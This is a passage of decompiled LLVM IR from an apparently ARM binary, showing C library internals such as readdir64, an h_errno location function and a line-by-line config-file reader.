  %v0_18ac8 = load i32, i32* @r4, align 4
  %v2_18ad0 = call i32 @fd_to_DIR(i32 %v0_18ac8, i32 %tmp)
  store i32 %v2_18ad0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18adc:                               ; preds = %entry, %dec_label_pc_18a94
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ac8, %dec_label_pc_18ac0, %dec_label_pc_18adc
  %v0_18ae0 = phi i32 [ %v2_18ad0, %dec_label_pc_18ac8 ], [ %v0_18ae0.pre, %dec_label_pc_18ac0 ], [ 0, %dec_label_pc_18adc ]
  ret i32 %v0_18ae0

; uselistorder directives
  uselistorder i32 %v2_18a9c, { 1, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder label %dec_label_pc_18ae0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18adc, { 1, 0 }
  uselistorder label %dec_label_pc_18ac0, { 1, 0 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_18af0 = add i32 %tmp, 24
  store i32 %v1_18af0, i32* @r4, align 4
  %v2_18af4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 ptrtoint (i8* @global_var_18078.1329 to i32), i32* @r1, align 4
  store i32 %v1_18af0, i32* @r2, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_18af4, i32* @r0, align 4
  %v1_18b10 = call i32 @_pthread_cleanup_push_defer()
  %v0_18b14 = load i32, i32* @r4, align 4
  store i32 %v0_18b14, i32* %r0.global-to-local, align 4
  store i32 101156, i32* @lr, align 4
  %v2_18b20 = call i32 @__pthread_return_0(i32 %v0_18b14)
  store i32 %v2_18b20, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_18b28

dec_label_pc_18b28:                               ; preds = %dec_label_pc_18b58, %entry
  %v0_18b28 = load i32, i32* @r5, align 4
  %v1_18b28 = add i32 %v0_18b28, 4
  %v2_18b28 = inttoptr i32 %v1_18b28 to i32*
  %v3_18b28 = load i32, i32* %v2_18b28, align 4
  %v4_18b28 = add i32 %v0_18b28, 8
  %v5_18b28 = inttoptr i32 %v4_18b28 to i32*
  %v6_18b28 = load i32, i32* %v5_18b28, align 4
  %tmp9 = icmp ugt i32 %v6_18b28, %v3_18b28
  br i1 %tmp9, label %dec_label_pc_18b58, label %dec_label_pc_18b34

dec_label_pc_18b34:                               ; preds = %dec_label_pc_18b28
  %v1_18b34 = inttoptr i32 %v0_18b28 to i32*
  %v2_18b34 = load i32, i32* %v1_18b34, align 4
  store i32 %v2_18b34, i32* %r0.global-to-local, align 4
  %v1_18b38 = add i32 %v0_18b28, 12
  %v2_18b38 = inttoptr i32 %v1_18b38 to i32*
  %v3_18b38 = load i32, i32* %v2_18b38, align 4
  %v1_18b3c = add i32 %v0_18b28, 20
  %v2_18b3c = inttoptr i32 %v1_18b3c to i32*
  %v3_18b3c = load i32, i32* %v2_18b3c, align 4
  %v4_18b40 = inttoptr i32 %v3_18b38 to i32*
  %v5_18b40 = call i32 @__getdents64(i32 %v2_18b34, i32* %v4_18b40, i32 %v3_18b3c, i32 %v6_18b28)
  store i32 %v5_18b40, i32* %r0.global-to-local, align 4
  %tmp8 = icmp slt i32 %v5_18b40, 1
  br i1 %tmp8, label %.thread, label %dec_label_pc_18b50

.thread:                                          ; preds = %dec_label_pc_18b34
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_18b90

dec_label_pc_18b50:                               ; preds = %dec_label_pc_18b34
  %v1_18b50 = load i32, i32* @r5, align 4
  %v2_18b50 = add i32 %v1_18b50, 8
  %v3_18b50 = inttoptr i32 %v2_18b50 to i32*
  store i32 %v5_18b40, i32* %v3_18b50, align 4
  %v0_18b54 = load i32, i32* @r6, align 4
  %v1_18b54 = load i32, i32* @r5, align 4
  %v2_18b54 = add i32 %v1_18b54, 4
  %v3_18b54 = inttoptr i32 %v2_18b54 to i32*
  store i32 %v0_18b54, i32* %v3_18b54, align 4
  %v0_18b58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b58

dec_label_pc_18b58:                               ; preds = %dec_label_pc_18b28, %dec_label_pc_18b50
  %v1_18b84 = phi i32 [ %v0_18b28, %dec_label_pc_18b28 ], [ %v0_18b58.pre, %dec_label_pc_18b50 ]
  %v1_18b58 = add i32 %v1_18b84, 4
  %v2_18b58 = inttoptr i32 %v1_18b58 to i32*
  %v3_18b58 = load i32, i32* %v2_18b58, align 4
  %v1_18b5c = add i32 %v1_18b84, 12
  %v2_18b5c = inttoptr i32 %v1_18b5c to i32*
  %v3_18b5c = load i32, i32* %v2_18b5c, align 4
  %v2_18b60 = add i32 %v3_18b5c, %v3_18b58
  store i32 %v2_18b60, i32* @r4, align 4
  %v1_18b64 = add i32 %v2_18b60, 16
  %v2_18b64 = inttoptr i32 %v1_18b64 to i8*
  %v3_18b64 = load i8, i8* %v2_18b64, align 1
  %v4_18b64 = zext i8 %v3_18b64 to i32
  store i32 %v4_18b64, i32* %r0.global-to-local, align 4
  %v1_18b68 = add i32 %v2_18b60, 17
  %v2_18b68 = inttoptr i32 %v1_18b68 to i8*
  %v3_18b68 = load i8, i8* %v2_18b68, align 1
  %v4_18b68 = zext i8 %v3_18b68 to i32
  %v3_18b6c = inttoptr i32 %v2_18b60 to i32*
  %v4_18b6c = load i32, i32* %v3_18b6c, align 4
  %v1_18b70 = add i32 %v2_18b60, 4
  %v2_18b70 = inttoptr i32 %v1_18b70 to i32*
  %v3_18b70 = load i32, i32* %v2_18b70, align 4
  %v4_18b74 = mul nuw nsw i32 %v4_18b64, 256
  %v5_18b74 = or i32 %v4_18b68, %v4_18b74
  %v1_18b78 = add i32 %v2_18b60, 12
  %v2_18b78 = inttoptr i32 %v1_18b78 to i32*
  %v3_18b78 = load i32, i32* %v2_18b78, align 4
  store i32 %v3_18b78, i32* %r0.global-to-local, align 4
  %v2_18b7c = add i32 %v5_18b74, %v3_18b58
  %v2_18b80 = or i32 %v3_18b70, %v4_18b6c
  %v4_18b80 = icmp eq i32 %v2_18b80, 0
  store i32 %v2_18b7c, i32* %v2_18b58, align 4
  %v0_18b88 = load i32, i32* %r0.global-to-local, align 4
  %v1_18b88 = load i32, i32* @r5, align 4
  %v2_18b88 = add i32 %v1_18b88, 16
  %v3_18b88 = inttoptr i32 %v2_18b88 to i32*
  store i32 %v0_18b88, i32* %v3_18b88, align 4
  br i1 %v4_18b80, label %dec_label_pc_18b28, label %dec_label_pc_18b90

dec_label_pc_18b90:                               ; preds = %dec_label_pc_18b58, %.thread
  store i32 %v2_18af4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_18ba0 = call i32 @_pthread_cleanup_pop_restore()
  %v0_18ba4 = load i32, i32* @r4, align 4
  store i32 %v0_18ba4, i32* %r0.global-to-local, align 4
  ret i32 %v0_18ba4

; uselistorder directives
  uselistorder i32 %v1_18b84, { 1, 0 }
  uselistorder i32 %v6_18b28, { 1, 0 }
  uselistorder i32 %v0_18b28, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 8, 6, 0, 7, 1 }
  uselistorder label %dec_label_pc_18b58, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_3468c.1606 to i32)
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %v3_18bcc = load i32, i32* @r4, align 4
  %v6_18bcc = load i32, i32* @r5, align 4
  %v9_18bcc = load i32, i32* @r6, align 4
  %v12_18bcc = load i32, i32* @r7, align 4
  %v15_18bcc = load i32, i32* @r8, align 4
  %v18_18bcc = load i32, i32* @sb, align 4
  %v21_18bcc = load i32, i32* @sl, align 4
  %v24_18bcc = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_18bd0 = icmp eq i32* %arg1, null
  store i1 %v2_18bd0, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_18bd0, label %dec_label_pc_18ee0, label %dec_label_pc_18be8

dec_label_pc_18be8:                               ; preds = %entry
  %v1_18be8 = urem i32 %arg3, 256
  store i32 %v1_18be8, i32* @sb, align 4
  %v1_18bec = and i32 %arg3, ptrtoint (i32* @global_var_ff00.45 to i32)
  %v3_18bf0 = udiv i32 %v1_18bec, 256
  %v3_18bf4 = mul nuw nsw i32 %v1_18be8, 4
  %v1_18bfc = or i32 %v3_18bf4, 1
  %v1_18c08 = and i32 %arg3, 131072
  %v1_18c0c = add nsw i32 %v1_18be8, -1
  %v1_18c18 = and i32 %arg3, 262144
  store i32 %v1_18c18, i32* %r2.global-to-local, align 4
  %v1_18c1c = and i32 %arg3, 65536
  store i32 %v1_18c1c, i32* %r3.global-to-local, align 4
  store i32 %v1_18c1c, i32* %stack_var_-68, align 4
  store i32 0, i32* @fp, align 4
  %v1_18c2c = add i32 %arg4, 1
  store i32 %v1_18c2c, i32* @sl, align 4
  %v2_18dac = inttoptr i32 %arg2 to i32*
  %v2_18dbc = icmp eq i32 %v1_18c08, 0
  %v2_18e14 = icmp eq i32 %v1_18c18, 0
  br label %dec_label_pc_18c30

dec_label_pc_18c30:                               ; preds = %dec_label_pc_18c30.backedge, %dec_label_pc_18be8
  %v2_18c4c = phi i32 [ %v0_18c30.pre, %dec_label_pc_18c30.backedge ], [ %tmp, %dec_label_pc_18be8 ]
  %v1_18c30 = add i32 %v2_18c4c, 4
  %v2_18c30 = inttoptr i32 %v1_18c30 to i32*
  %v3_18c30 = load i32, i32* %v2_18c30, align 4
  store i32 %v3_18c30, i32* %r3.global-to-local, align 4
  %v2_18c34 = icmp eq i32 %v3_18c30, 0
  store i1 %v2_18c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c34, label %dec_label_pc_18c3c, label %dec_label_pc_18c84

dec_label_pc_18c3c:                               ; preds = %dec_label_pc_18c30
  %v1_18c3c = add i32 %v2_18c4c, 16
  %v2_18c3c = inttoptr i32 %v1_18c3c to i32*
  %v3_18c3c = load i32, i32* %v2_18c3c, align 4
  store i32 %v3_18c3c, i32* %r3.global-to-local, align 4
  %v2_18c40 = icmp eq i32 %v3_18c3c, 0
  store i1 %v2_18c40, i1* %cpsr_z.global-to-local, align 1
  %v1_18c44 = add i32 %v2_18c4c, 8
  %v2_18c44 = inttoptr i32 %v1_18c44 to i32*
  %v3_18c44 = load i32, i32* %v2_18c44, align 4
  store i32 %v3_18c44, i32* %r3.global-to-local, align 4
  br i1 %v2_18c40, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_18c3c
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_18c3c, align 4
  %v0_18c50.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_18c3c, %bb
  %v0_18c50 = phi i32 [ %v0_18c50.pre, %bb ], [ %v3_18c44, %dec_label_pc_18c3c ]
  %v2_18c50 = icmp eq i32 %v0_18c50, 0
  store i1 %v2_18c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18c50, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_18bfc, i32* %r3.global-to-local, align 4
  %v2_18c58 = load i32, i32* @r5, align 4
  %v3_18c58 = add i32 %v2_18c58, 8
  %v4_18c58 = inttoptr i32 %v3_18c58 to i32*
  store i32 %v1_18bfc, i32* %v4_18c58, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_18c5c = load i32, i32* @r5, align 4
  %v1_18c5c = add i32 %v0_18c5c, 16
  %v2_18c5c = inttoptr i32 %v1_18c5c to i32*
  %v3_18c5c = load i32, i32* %v2_18c5c, align 4
  store i32 %v3_18c5c, i32* %r0.global-to-local, align 4
  %v1_18c60 = add i32 %v0_18c5c, 8
  %v2_18c60 = inttoptr i32 %v1_18c60 to i32*
  %v3_18c60 = load i32, i32* %v2_18c60, align 4
  store i32 %v3_18c60, i32* %r3.global-to-local, align 4
  %v2_18c64 = add i32 %v3_18c60, %v3_18c5c
  store i32 %v2_18c64, i32* %r0.global-to-local, align 4
  %v1_18c68 = call i32 @malloc(i32 %v2_18c64)
  store i32 %v1_18c68, i32* %r0.global-to-local, align 4
  %v2_18c6c = icmp eq i32 %v1_18c68, 0
  store i1 %v2_18c6c, i1* %cpsr_z.global-to-local, align 1
  %v1_18c70 = load i32, i32* @r5, align 4
  %v2_18c70 = add i32 %v1_18c70, 4
  %v3_18c70 = inttoptr i32 %v2_18c70 to i32*
  store i32 %v1_18c68, i32* %v3_18c70, align 4
  br i1 %v2_18c6c, label %dec_label_pc_18ee0, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %.thread
  %v0_18c78 = load i32, i32* @r5, align 4
  %v1_18c78 = add i32 %v0_18c78, 20
  %v2_18c78 = inttoptr i32 %v1_18c78 to i32*
  %v3_18c78 = load i32, i32* %v2_18c78, align 4
  %v1_18c7c = or i32 %v3_18c78, 1
  store i32 %v1_18c7c, i32* %r3.global-to-local, align 4
  store i32 %v1_18c7c, i32* %v2_18c78, align 4
  %v0_18c84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18c84

dec_label_pc_18c84:                               ; preds = %dec_label_pc_18c30, %dec_label_pc_18c78
  %v1_18c8c = phi i32 [ %v2_18c4c, %dec_label_pc_18c30 ], [ %v0_18c84.pre, %dec_label_pc_18c78 ]
  %v1_18c84 = add i32 %v1_18c8c, 4
  %v2_18c84 = inttoptr i32 %v1_18c84 to i32*
  %v3_18c84 = load i32, i32* %v2_18c84, align 4
  store i32 %v3_18c84, i32* %r2.global-to-local, align 4
  %v4_18c84 = add i32 %v1_18c8c, 8
  %v5_18c84 = inttoptr i32 %v4_18c84 to i32*
  %v6_18c84 = load i32, i32* %v5_18c84, align 4
  %v2_18c88 = add i32 %v6_18c84, %v3_18c84
  store i32 %v2_18c88, i32* %r3.global-to-local, align 4
  %v2_18c8c = add i32 %v1_18c8c, 12
  %v3_18c8c = inttoptr i32 %v2_18c8c to i32*
  store i32 %v2_18c88, i32* %v3_18c8c, align 4
  %v0_18c90 = load i32, i32* @fp, align 4
  store i32 %v0_18c90, i32* @r6, align 4
  br label %dec_label_pc_18c94

dec_label_pc_18c94:                               ; preds = %dec_label_pc_18d20, %dec_label_pc_18d0c, %dec_label_pc_18c84
  %v0_18c9c = phi i32 [ %v0_18c90, %dec_label_pc_18c84 ], [ %v1_18d0c, %dec_label_pc_18d0c ], [ %v0_18c9c.pre.pre, %dec_label_pc_18d20 ]
  %v0_18c94 = load i32, i32* @r5, align 4
  %v1_18c94 = add i32 %v0_18c94, 12
  store i32 %v1_18c94, i32* %r0.global-to-local, align 4
  %v1_18c98 = inttoptr i32 %v1_18c94 to i32*
  %v2_18c98 = load i32, i32* %v1_18c98, align 4
  store i32 %v2_18c98, i32* %r0.global-to-local, align 4
  %v3_18c98 = add i32 %v0_18c94, 16
  %v4_18c98 = inttoptr i32 %v3_18c98 to i32*
  %v5_18c98 = load i32, i32* %v4_18c98, align 4
  %v2_18c9c = add i32 %v2_18c98, %v0_18c9c
  store i32 %v2_18c9c, i32* %r0.global-to-local, align 4
  %v2_18ca0 = sub i32 %v5_18c98, %v0_18c9c
  %v1_18ca4 = inttoptr i32 %v0_18c94 to i32*
  %v2_18ca4 = load i32, i32* %v1_18ca4, align 4
  store i32 %v2_18ca4, i32* %r2.global-to-local, align 4
  %v3_18ca8 = call i32 @fgets(i32 %v2_18c9c, i32 %v2_18ca0, i32 %v2_18ca4)
  store i32 %v3_18ca8, i32* %r0.global-to-local, align 4
  store i32 %v3_18ca8, i32* %r4.global-to-local, align 4
  %v2_18cac = icmp eq i32 %v3_18ca8, 0
  store i1 %v2_18cac, i1* %cpsr_z.global-to-local, align 1
  %v0_18cb4 = load i32, i32* @r5, align 4
  %v1_18cb4 = add i32 %v0_18cb4, 12
  br i1 %v2_18cac, label %dec_label_pc_18cb4, label %dec_label_pc_18ccc

dec_label_pc_18cb4:                               ; preds = %dec_label_pc_18c94
  store i32 %v1_18cb4, i32* %r0.global-to-local, align 4
  %v1_18cb8 = inttoptr i32 %v1_18cb4 to i32*
  %v2_18cb8 = load i32, i32* %v1_18cb8, align 4
  store i32 %v2_18cb8, i32* %r0.global-to-local, align 4
  %v3_18cb8 = add i32 %v0_18cb4, 16
  %v4_18cb8 = inttoptr i32 %v3_18cb8 to i32*
  %v5_18cb8 = load i32, i32* %v4_18cb8, align 4
  store i32 %v5_18cb8, i32* @r2, align 4
  %v2_18cc0 = inttoptr i32 %v2_18cb8 to i8*
  %v3_18cc0 = call i32 @__GI_memset(i8* %v2_18cc0, i32 0)
  store i32 %v3_18cc0, i32* %r0.global-to-local, align 4
  %v0_18cc4 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18ee4

dec_label_pc_18ccc:                               ; preds = %dec_label_pc_18c94
  %v2_18ccc = inttoptr i32 %v1_18cb4 to i32*
  %v3_18ccc = load i32, i32* %v2_18ccc, align 4
  store i32 %v3_18ccc, i32* @r4, align 4
  %v1_18cd0 = load i32, i32* @r6, align 4
  %v2_18cd0 = add i32 %v1_18cd0, %v3_18ccc
  %v3_18cd0 = inttoptr i32 %v2_18cd0 to i8*
  store i32 %v2_18cd0, i32* %r0.global-to-local, align 4
  %v3_18cd4 = call i32 @strlen(i8* %v3_18cd0)
  %v0_18cdc = load i32, i32* @r6, align 4
  %v2_18cdc = add i32 %v0_18cdc, %v3_18cd4
  store i32 %v2_18cdc, i32* @r6, align 4
  %v0_18ce0 = load i32, i32* @r4, align 4
  store i32 %v0_18ce0, i32* %r0.global-to-local, align 4
  %v2_18ce4 = call i32 @__GI_strchr(i32 %v0_18ce0, i32 10)
  store i32 %v2_18ce4, i32* %r0.global-to-local, align 4
  %v2_18ce8 = icmp eq i32 %v2_18ce4, 0
  store i1 %v2_18ce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ce8, label %dec_label_pc_18d14, label %dec_label_pc_18cf0

dec_label_pc_18cf0:                               ; preds = %dec_label_pc_18ccc
  %v1_18cf0 = inttoptr i32 %v2_18ce4 to i8*
  %v2_18cf0 = load i8, i8* %v1_18cf0, align 1
  %v3_18cf0 = zext i8 %v2_18cf0 to i32
  %v1_18cf4 = add nuw nsw i32 %v3_18cf0, 255
  %v1_18cf8 = urem i32 %v1_18cf4, 256
  store i32 %v1_18cf8, i32* %r3.global-to-local, align 4
  %v7_18cfc = icmp eq i32 %v1_18cf8, 92
  store i1 %v7_18cfc, i1* %cpsr_z.global-to-local, align 1
  %v1_18d00 = trunc i32 %v1_18cf4 to i8
  store i8 %v1_18d00, i8* %v1_18cf0, align 1
  %v0_18d04 = load i32, i32* @r6, align 4
  %v1_18d04 = add i32 %v0_18d04, -1
  store i32 %v1_18d04, i32* @r6, align 4
  %v0_18d08 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18d08, label %dec_label_pc_18d0c, label %dec_label_pc_18d98

dec_label_pc_18d0c:                               ; preds = %dec_label_pc_18cf0
  %v1_18d0c = add i32 %v0_18d04, -2
  store i32 %v1_18d0c, i32* @r6, align 4
  br label %dec_label_pc_18c94

dec_label_pc_18d14:                               ; preds = %dec_label_pc_18ccc
  %v0_18d14 = load i32, i32* @r5, align 4
  %v1_18d14 = add i32 %v0_18d14, 20
  %v2_18d14 = inttoptr i32 %v1_18d14 to i32*
  %v3_18d14 = load i32, i32* %v2_18d14, align 4
  store i32 %v3_18d14, i32* %r3.global-to-local, align 4
  %v2_18d18 = icmp eq i32 %v3_18d14, 0
  store i1 %v2_18d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d18, label %dec_label_pc_18d50, label %dec_label_pc_18d20

dec_label_pc_18d20:                               ; preds = %dec_label_pc_18d14
  %v1_18d20 = add i32 %v0_18d14, 16
  %v2_18d20 = inttoptr i32 %v1_18d20 to i32*
  %v3_18d20 = load i32, i32* %v2_18d20, align 4
  store i32 %v3_18d20, i32* %r3.global-to-local, align 4
  %v1_18d24 = add i32 %v0_18d14, 8
  %v2_18d24 = inttoptr i32 %v1_18d24 to i32*
  %v3_18d24 = load i32, i32* %v2_18d24, align 4
  %v1_18d28 = add i32 %v3_18d20, 4096
  store i32 %v1_18d28, i32* %r3.global-to-local, align 4
  %v2_18d2c = add i32 %v3_18d24, %v1_18d28
  store i32 %v1_18d28, i32* %v2_18d20, align 4
  %v0_18d34 = load i32, i32* @r5, align 4
  %v1_18d34 = add i32 %v0_18d34, 4
  %v2_18d34 = inttoptr i32 %v1_18d34 to i32*
  %v3_18d34 = load i32, i32* %v2_18d34, align 4
  store i32 %v3_18d34, i32* %r0.global-to-local, align 4
  %v2_18d38 = inttoptr i32 %v3_18d34 to i32*
  %v3_18d38 = call i32 @realloc(i32* %v2_18d38, i32 %v2_18d2c)
  store i32 %v3_18d38, i32* %r0.global-to-local, align 4
  %v0_18d3c = load i32, i32* @r5, align 4
  %v1_18d3c = add i32 %v0_18d3c, 8
  %v2_18d3c = inttoptr i32 %v1_18d3c to i32*
  %v3_18d3c = load i32, i32* %v2_18d3c, align 4
  %v2_18d40 = add i32 %v3_18d3c, %v3_18d38
  store i32 %v2_18d40, i32* %r3.global-to-local, align 4
  %v2_18d44 = add i32 %v0_18d3c, 12
  %v3_18d44 = inttoptr i32 %v2_18d44 to i32*
  store i32 %v2_18d40, i32* %v3_18d44, align 4
  %v1_18d48 = load i32, i32* @r5, align 4
  %v2_18d48 = add i32 %v1_18d48, 4
  %v3_18d48 = inttoptr i32 %v2_18d48 to i32*
  store i32 %v3_18d38, i32* %v3_18d48, align 4
  %v0_18c9c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18c94

dec_label_pc_18d50:                               ; preds = %dec_label_pc_18d14, %.dec_label_pc_18d50_crit_edge
  %v0_18d50 = phi i32 [ %v0_18d50.pre, %.dec_label_pc_18d50_crit_edge ], [ %v0_18d14, %dec_label_pc_18d14 ]
  %v1_18d50 = inttoptr i32 %v0_18d50 to i32*
  %v2_18d50 = load i32, i32* %v1_18d50, align 4
  %v1_18d54 = add i32 %v2_18d50, 52
  %v2_18d54 = inttoptr i32 %v1_18d54 to i32*
  %v3_18d54 = load i32, i32* %v2_18d54, align 4
  store i32 %v3_18d54, i32* %r3.global-to-local, align 4
  %v2_18d58 = icmp eq i32 %v3_18d54, 0
  store i1 %v2_18d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18d58, label %dec_label_pc_18d84, label %dec_label_pc_18d60

dec_label_pc_18d60:                               ; preds = %dec_label_pc_18d50
  %v1_18d60 = add i32 %v2_18d50, 16
  %v2_18d60 = inttoptr i32 %v1_18d60 to i32*
  %v3_18d60 = load i32, i32* %v2_18d60, align 4
  store i32 %v3_18d60, i32* %r2.global-to-local, align 4
  %v1_18d64 = add i32 %v2_18d50, 24
  %v2_18d64 = inttoptr i32 %v1_18d64 to i32*
  %v3_18d64 = load i32, i32* %v2_18d64, align 4
  store i32 %v3_18d64, i32* %r3.global-to-local, align 4
  %v3_18d68 = icmp ult i32 %v3_18d60, %v3_18d64
  %v9_18d68 = icmp eq i32 %v3_18d60, %v3_18d64
  store i1 %v9_18d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18d68, label %dec_label_pc_18d8cthread-pre-split, label %dec_label_pc_18d78

dec_label_pc_18d78:                               ; preds = %dec_label_pc_18d60
  store i32 %v2_18d50, i32* %r0.global-to-local, align 4
  %v1_18d7c = inttoptr i32 %v2_18d50 to i8*
  %v2_18d7c = call i32 @getc_unlocked(i8* %v1_18d7c)
  store i32 %v2_18d7c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d8c

dec_label_pc_18d84:                               ; preds = %dec_label_pc_18d50
  store i32 %v2_18d50, i32* %r0.global-to-local, align 4
  %v1_18d88 = call i32 @__GI_fgetc(i32 %v2_18d50)
  store i32 %v1_18d88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d8c

dec_label_pc_18d8cthread-pre-split:               ; preds = %dec_label_pc_18d60
  %v2_18d6c = inttoptr i32 %v3_18d60 to i8*
  %v3_18d6c = load i8, i8* %v2_18d6c, align 1
  %v4_18d6c = zext i8 %v3_18d6c to i32
  store i32 %v4_18d6c, i32* %r0.global-to-local, align 4
  %v6_18d6c = add i32 %v3_18d60, 1
  store i32 %v6_18d6c, i32* %r2.global-to-local, align 4
  store i32 %v6_18d6c, i32* %v2_18d60, align 4
  %v0_18d8c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18d8c

dec_label_pc_18d8c:                               ; preds = %dec_label_pc_18d8cthread-pre-split, %dec_label_pc_18d78, %dec_label_pc_18d84
  %v1_18d90 = phi i32 [ %v0_18d8c.pr, %dec_label_pc_18d8cthread-pre-split ], [ %v2_18d7c, %dec_label_pc_18d78 ], [ %v1_18d88, %dec_label_pc_18d84 ]
  %v7_18d8c = icmp eq i32 %v1_18d90, 10
  store i1 %v7_18d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d8c, label %dec_label_pc_18d98.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_18d8c
  %v8_18d90 = icmp eq i32 %v1_18d90, -1
  store i1 %v8_18d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18d90, label %dec_label_pc_18d98.loopexit, label %.dec_label_pc_18d50_crit_edge

.dec_label_pc_18d50_crit_edge:                    ; preds = %bb68
  %v0_18d50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18d50

dec_label_pc_18d98.loopexit:                      ; preds = %bb68, %dec_label_pc_18d8c
  %v0_18d98.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_18d98

dec_label_pc_18d98:                               ; preds = %dec_label_pc_18cf0, %dec_label_pc_18d98.loopexit
  %v0_18d98 = phi i32 [ %v0_18d98.pre, %dec_label_pc_18d98.loopexit ], [ %v1_18d04, %dec_label_pc_18cf0 ]
  %v7_18d98 = icmp eq i32 %v0_18d98, -1
  store i1 %v7_18d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18d98, label %dec_label_pc_18ee0, label %dec_label_pc_18da0

dec_label_pc_18da0:                               ; preds = %dec_label_pc_18d98
  %v0_18da0 = load i32, i32* @r5, align 4
  %v1_18da0 = add i32 %v0_18da0, 4
  %v2_18da0 = inttoptr i32 %v1_18da0 to i32*
  %v3_18da0 = load i32, i32* %v2_18da0, align 4
  store i32 %v3_18da0, i32* %r0.global-to-local, align 4
  store i32 %v3_18bf4, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_18da0, i32* %v2_18dac, align 4
  %v0_18db0 = load i32, i32* @fp, align 4
  %v2_18db4 = inttoptr i32 %v3_18da0 to i8*
  %v3_18db4 = call i32 @__GI_memset(i8* %v2_18db4, i32 %v0_18db0)
  store i32 %v3_18db4, i32* %r0.global-to-local, align 4
  store i32 %v1_18c08, i32* %r2.global-to-local, align 4
  store i1 %v2_18dbc, i1* %cpsr_z.global-to-local, align 1
  %v0_18dc0 = load i32, i32* @r5, align 4
  %v1_18dc0 = add i32 %v0_18dc0, 12
  %v2_18dc0 = inttoptr i32 %v1_18dc0 to i32*
  %v3_18dc0 = load i32, i32* %v2_18dc0, align 4
  store i32 %v3_18dc0, i32* @r4, align 4
  br i1 %v2_18dbc, label %dec_label_pc_18dd8, label %dec_label_pc_18dc8

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18da0
  store i32 %v3_18dc0, i32* @r0, align 4
  %v1_18dd0 = inttoptr i32 %v3_18dc0 to i8*
  %v2_18dd0 = call i32 @__GI_strspn(i8* %v1_18dd0)
  store i32 %v2_18dd0, i32* %r0.global-to-local, align 4
  %v0_18dd4 = load i32, i32* @r4, align 4
  %v2_18dd4 = add i32 %v0_18dd4, %v2_18dd0
  store i32 %v2_18dd4, i32* @r4, align 4
  br label %dec_label_pc_18dd8

dec_label_pc_18dd8:                               ; preds = %dec_label_pc_18da0, %dec_label_pc_18dc8
  %v0_18eb013 = phi i32 [ %v3_18dc0, %dec_label_pc_18da0 ], [ %v2_18dd4, %dec_label_pc_18dc8 ]
  %v1_18dd8 = inttoptr i32 %v0_18eb013 to i8*
  %v2_18dd8 = load i8, i8* %v1_18dd8, align 1
  %v3_18dd8 = zext i8 %v2_18dd8 to i32
  store i32 %v3_18dd8, i32* %r2.global-to-local, align 4
  %v2_18ddc = icmp eq i8 %v2_18dd8, 0
  store i1 %v2_18ddc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ddc, label %dec_label_pc_18c30.backedge, label %dec_label_pc_18de4

dec_label_pc_18c30.backedge:                      ; preds = %dec_label_pc_18dd8, %dec_label_pc_18ed8, %dec_label_pc_18de4
  %v0_18c30.pre = load i32, i32* @r5, align 4
